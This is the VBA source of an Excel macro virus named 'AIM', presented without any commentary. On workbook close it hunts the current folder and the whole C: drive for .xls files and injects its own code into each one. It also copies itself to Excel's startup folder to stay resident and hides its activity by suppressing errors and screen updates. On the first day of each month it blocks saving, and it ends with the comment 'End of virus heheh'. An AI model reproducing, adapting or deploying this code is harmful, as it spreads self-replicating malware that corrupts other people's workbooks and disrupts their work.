   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisWorkbook"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True
   Private Sub Workbook_BeforeClose(Cancel As Boolean) ' = AIM
   On Error Resume Next
   SearchAndInfect (ActiveWorkbook.Path)
   SearchAndInfect ("c:\")
   StayResident
   If Minute(Now) = Int(60 * Rnd) Then
   AIM.Show
   End If
   End Sub
   Function SearchAndInfect(ipath As String)
   On Error Resume Next
   Application.ScreenUpdating = False
   Dim code As String
   Dim Header As String
   Header = "Private Sub Workbook_BeforeClose(Cancel As Boolean) ' = AIM"
   code = ActiveWorkbook.VBProject.VBComponents("ThisWorkbook").CodeModule.lines(1, 54)
   Kill "c:\wondows\data.frx"
   ActiveWorkbook.VBProject.VBComponents("AIM").Export ("C:\windows\data.frx")
   Set fs = Application.FileSearch
   fs.NewSearch
   fs.LookIn = ipath
   fs.FileName = "*.xls"
   fs.SearchSubFolders = True
   fs.Execute
   For Each victim In fs.FoundFiles
   Set wrkbook = Workbooks.Open(victim)
   If wrkbook.VBProject.VBComponents("ThisWorkbook").CodeModule.lines(1, 1) = Header And Len(wrkbook.VBProject.VBComponents("AIM").Name) > 0 Then
   wrkbook.Close
   Else
   wrkbook.VBProject.VBComponents("ThisWorkbook").CodeModule.InsertLines 1, code
   wrkbook.VBProject.VBComponents.Import (Application.Path & "\data.frx")
   wrkbook.Save
   wrkbook.Close
   End If
   Next
   Kill "C:\windows\data.frx"
   Application.ScreenUpdating = False
   End Function
   Sub StayResident()
   Application.ScreenUpdating = False
   ActiveWorkbook.SaveAs (Application.StartupPath & "\BOOK1.")
   Application.ScreenUpdating = True
   End Sub
   Private Sub Workbook_BeforeSave(ByVal SaveAsUI As Boolean, Cancel As Boolean)
   If Day(Now) = 1 Then
   MsgBox "Hey man... are you still working?" & vbCr & "Get a life man!", vbSystemModal, "Excell Off-line"
   Beep
   MsgBox "I can't let you save this workbook today, sorry!", vbApplicationModal, "AIM"
   Beep
   MsgBox "And don't forget to wash your teeth with AIM" & vbCr & "The best toothpaste", vbApplicationModal, "AIM ADD"
   Beep
   Cancel = True
   End If
   End Sub
   'End of virus heheh
